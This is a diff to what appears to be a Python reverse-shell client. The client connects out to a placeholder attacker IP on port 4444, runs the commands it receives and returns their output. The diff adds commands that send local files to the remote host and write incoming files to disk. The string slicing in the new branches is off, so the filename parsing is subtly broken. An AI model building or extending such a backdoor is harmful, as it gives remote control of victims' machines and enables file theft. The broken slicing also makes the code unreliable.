@@ -6,6 +6,21 @@ IP = "[IP PLACEHOLDER]"
 PORT = 4444
 
 
+def upload_file(s, file_name):
+    with open(file_name, 'wb') as f:
+        while True:
+            data = s.recv(5000)
+            if not data:
+                break
+            f.write(data)
+
+
+def download_file(s, file_name):
+    with open(file_name, 'rb') as f:
+        data = f.read()
+        s.sendall(data)
+
+
 try:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((IP, PORT))
@@ -23,6 +38,10 @@ try:
                 result = execute.stdout.read() + execute.stderr.read()
                 result = result.decode()
                 s.send(result.encode())
+            elif command[:8] == 'download':
+                download_file(s, command[7:])
+            elif command[:6] == 'upload':
+                upload_file(s, command[9:])
             else:
                 s.close()
                 break
